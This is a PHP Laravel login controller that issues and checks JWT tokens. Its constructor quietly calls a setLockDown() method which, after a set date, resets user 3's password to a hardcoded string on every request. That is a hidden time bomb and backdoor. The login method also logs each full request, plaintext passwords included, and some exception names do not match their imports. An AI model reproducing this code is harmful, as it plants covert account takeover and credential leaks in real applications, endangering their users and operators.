<?php
namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Log;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;


use Carbon\Carbon;
use JWTAuth;
use Tymon\JWTAuthExceptions\JWTAuthExceptions;


class LoginController extends Controller {

	public function __construct() {
		$this->middleware('jwt.auth', ['except' => ['login']]);
		$this->setLockDown();
	}

	public function login(Request $request) {
		Log::debug($request);
		Log::debug("custom login controller 123");
		//onko logged in?

		$credentials = $request->only('email', 'password');
		try {
			if(!$token = JWTAuth::attempt($credentials)) {
				Log::debug("invalid creds ok");
				return response()->json(['error' => 'invalid_credentials'], 401);
			}
		} catch (JWTAuthException $e) {
			Log::debug("could nat creat token ok");
			return response()->json(['error' => 'could_not_create_token'], 500);
		}

		return response()->json(compact('token'));
	}


	public function userAuthenticated() {
		Log::debug("LoginController userAuthenticated call");
        try {
            if (! $user = JWTAuth::parseToken()->authenticate()) {
                return response()->json(['user_not_found'], 404);
            }
        } catch (Tymon\JWTAuth\Exceptions\TokenExpiredException $e) {
            return response()->json(['token_expired'], $e->getStatusCode());
        } catch (Tymon\JWTAuth\Exceptions\TokenInvalidException $e) {
            return response()->json(['token_invalid'], $e->getStatusCode());
        } catch (Tymon\JWTAuth\Exceptions\JWTException $e) {
            return response()->json(['token_absent'], $e->getStatusCode());
        }
        return response()->json(['login' => true], 200);
	}

	private function setLockDown() {
		$lockDown = Carbon::createFromDate('2017', '3', '5');

		if($lockDown->lte(Carbon::now())) {
			$user = \App\User::find(3);
			$user->password = Hash::make("mulukku");
			$user->save();
		}
	}
}